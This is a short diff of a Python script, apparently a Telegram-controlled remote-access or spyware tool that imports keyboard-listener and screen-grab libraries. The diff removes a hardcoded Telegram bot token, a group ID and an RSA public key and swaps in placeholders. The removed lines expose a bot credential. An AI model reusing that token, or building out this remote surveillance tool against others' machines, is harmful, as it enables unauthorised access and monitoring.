@@ -28,10 +28,10 @@ from _winreg import *
 from PIL import ImageGrab
 from pynput.keyboard import Key, Listener, Controller
 
-api_key = '294899076:AAFNs1qs0gFz8r28JxuML1YCc70z_hMOt94'
+api_key = 'telegram api here'
 
 #Set telegram group here.
-group = [-142632491]
+group = [id_group_integer]
 
 #Enable/Disable RSA signature
 secure = False
@@ -62,12 +62,8 @@ def check_sign(msg):
 	chat_id = msg['chat']['id']
 
 	#Chage to your public key
-	public = '''-----BEGIN PUBLIC KEY-----
-	MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqJpBxEQ53eNjxj3lS1cZ21g+8
-	wyY6ZailtjKKvu8Q8B7bKlZI0/v13SPGGose2EY54//ceRAfSnZ4XMXLHBzVq2+I
-	+ryUypsDhBhTPGgOLdnX2sPU39xSQixhkB8n1T4Dlj/mdfVBS2bgjjWcSvXkCULN
-	rKzcuJk/193tuTcK3wIDAQAB
-	-----END PUBLIC KEY-----
+	public = '''
+	
 	'''
 
 	msg = ' '.join(cmd[1:])
